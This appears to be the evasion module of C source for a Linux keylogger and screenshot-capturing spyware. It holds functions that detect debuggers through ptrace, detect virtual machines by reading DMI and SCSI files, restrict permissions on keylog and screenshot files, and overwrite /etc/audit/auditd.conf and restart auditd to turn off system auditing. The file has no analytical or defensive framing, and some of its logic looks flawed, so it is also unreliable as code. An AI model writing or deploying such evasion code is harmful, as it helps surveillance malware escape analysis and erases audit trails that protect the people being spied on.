#include "evasion.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>

int evasion_check_debugger() {
	// Check for debugger presence using ptrace
	if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
		return 1; // Debugger detected
	}
	ptrace(PTRACE_DETACH, 0, 1, 0);
	return 0; // No debugger
}

int evasion_check_vm() {
	// Check for VM-specific files
	const char *vm_files[] = {
		 "/proc/scsi/scsi",
		 "/sys/class/dmi/id/product_name",
		 "/sys/class/dmi/id/sys_vendor",
		 NULL
	};

	for (int i = 0; vm_files[i]; i++) {
		FILE *file = fopen(vm_files[i], "r");
		if (file) {
			char buffer[256];
			while (fgets(buffer, sizeof(buffer), file)) {
				if (strstr(buffer, "VMware") || strstr(buffer, "VirtualBox") || 
					strstr(buffer, "QEMU") || strstr(buffer, "KVM")) {
					fclose(file);
					return 1; // VM detected
				}
			}
			fclose(file);
		}
	}

	return 0; // No VM detected
}

int evasion_hide_files() {
	// Hide log files and screenshots
	const char *files_to_hide[] = {
		 KEYLOGGER_LOG_FILE,
		 SCREENSHOT_DIR,
		 NULL
	};

	for (int i = 0; files_to_hide[i]; i++) {
		if (chmod(files_to_hide[i], 0600) == -1) {
			return -1;
		}
	}

	return 0;
}

int evasion_disable_audit() {
	// Disable system audit logging
	FILE *file = fopen("/etc/audit/auditd.conf", "r+");
	if (file) {
		char buffer[1024];
		long pos = 0;

		while (fgets(buffer, sizeof(buffer), file)) {
			if (strstr(buffer, "enable = 1")) {
				fseek(file, pos, SEEK_SET);
				fprintf(file, "enable = 0\n");
				fflush(file);
				break;
			}
			pos = ftell(file);
		}
		fclose(file);
	}

	// Restart auditd service
	system("service auditd restart > /dev/null 2>&1");
	return 0;
}
